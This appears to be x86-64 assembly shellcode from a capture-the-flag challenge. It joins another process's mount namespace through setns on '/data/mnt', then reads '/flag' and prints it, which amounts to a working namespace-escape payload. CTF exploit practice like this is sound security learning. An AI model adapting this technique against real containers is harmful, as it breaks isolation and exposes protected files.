.globl _start
.intel_syntax noprefix

_start:
    lea rdi, [rip + MNT_NS]  # fd = open("/data/mnt", O_RDONLY)
    mov rsi, 0
    mov rdx, 0
    mov rax, 2
    syscall

    mov rdi, rax  # setns(fd, CLONE_NEWNS)
    mov rsi, 0x20000
    mov rax, 308
    syscall

    lea rdi, [rip + FLAG]  # fd = open("/flag", O_RDONLY)
    mov rsi, 0
    mov rdx, 0
    mov rax, 2  
    syscall

    mov rdi, rax  # read(fd, FLAG, 0x50)
    lea rsi, [rip + FLAG]
    mov rdx, 0x50
    mov rax, 0
    syscall

    mov rdi, 1  # write(1, FLAG, 0x50)
    lea rsi, [rip + FLAG]
    mov rdx, 0x50
    mov rax, 1
    syscall

TMPFS:
    .string "tmpfs"
    .rept 0x50
    .byte 0x00
    .endr

DATA:
    .string "/data"
    .rept 0x50
    .byte 0x00
    .endr

MNT_NS:
    .string "/data/mnt"
    .rept 0x50
    .byte 0x00
    .endr

FLAG:
    .string "/flag"
    .rept 0x50
    .byte 0x00
    .endr
